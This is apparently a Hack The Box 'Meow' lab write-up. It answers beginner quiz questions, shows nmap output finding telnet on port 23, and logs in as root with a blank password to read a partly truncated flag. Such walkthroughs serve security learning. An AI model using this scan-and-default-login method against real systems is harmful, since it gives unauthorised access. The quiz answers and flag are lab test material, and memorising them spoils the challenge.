# HTB - Meow

#very-easy #linux

[TOC]

#### What does the acronym VM stand for?

Virtual Machine

#### What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.

terminal

#### What service do we use to form our VPN connection into HTB labs?

openvpn

#### What tool do we use to test our connection to the target with an ICMP echo request?

ping

#### What is the name of the most common tool for finding open ports on a target?

nmap

#### What service do we identify on port 23/tcp during our scans?

telnet

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap 10.129.1.17 -sC -sV -p 23            
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 16:45 UTC
Nmap scan report for 10.129.1.17
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.94 seconds
```

#### What username is able to log into the target over telnet with a blank password?

root

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ telnet 10.129.1.17 23
Trying 10.129.1.17...
Connected to 10.129.1.17.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 07 Mar 2026 04:47:12 PM UTC

  System load:           0.07
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             144
  Users logged in:       0
  IPv4 address for eth0: 10.129.1.17
  IPv6 address for eth0: dead:beef::250:56ff:feb0:3029

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# 

```

#### Submit root flag

```bash
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
b40ab...
```

